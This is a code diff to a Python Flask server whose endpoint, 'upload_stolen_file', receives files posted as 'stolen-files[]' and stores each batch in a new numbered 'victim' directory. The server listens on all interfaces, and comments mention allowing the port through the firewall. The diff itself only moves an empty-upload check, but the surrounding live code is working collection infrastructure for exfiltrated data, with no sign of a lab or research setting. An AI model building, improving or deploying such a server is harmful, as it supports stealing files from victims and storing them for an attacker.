@@ -15,12 +15,6 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 def upload_stolen_file():
     def upload_1_file(file):
         print("File upload method: Single")
-        if file.filename == '':
-            response = {
-                'status': 'error',
-                'message': 'No file uploaded. Why?'
-            }
-            return jsonify(response), 400
         filename = secure_filename(file.filename)
         file.save(os.path.join(victim_dir, filename))
         return filename
@@ -58,6 +52,14 @@ def upload_stolen_file():
         print("request.files keys:", request.files.keys())
         print("request.files values:", request.files.values())
 
+        files = request.files.getlist('stolen-files[]')
+        if files[0].filename == '':
+            response = {
+                'status': 'error',
+                'message': 'No file uploaded.'
+            }
+            return jsonify(response), 400
+
         while True:
             victim_dir = os.path.join(UPLOAD_FOLDER, f"victim-{victim_index}/")
             if not os.path.exists(victim_dir):
@@ -66,7 +68,6 @@ def upload_stolen_file():
             else:
                 victim_index += 1
         
-        files = request.files.getlist('stolen-files[]')
         if files:
             filename = upload_multi_file(files)
         else:
@@ -101,5 +102,6 @@ def check_availability():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
+
 #Specify port
 #Allow port through firewall
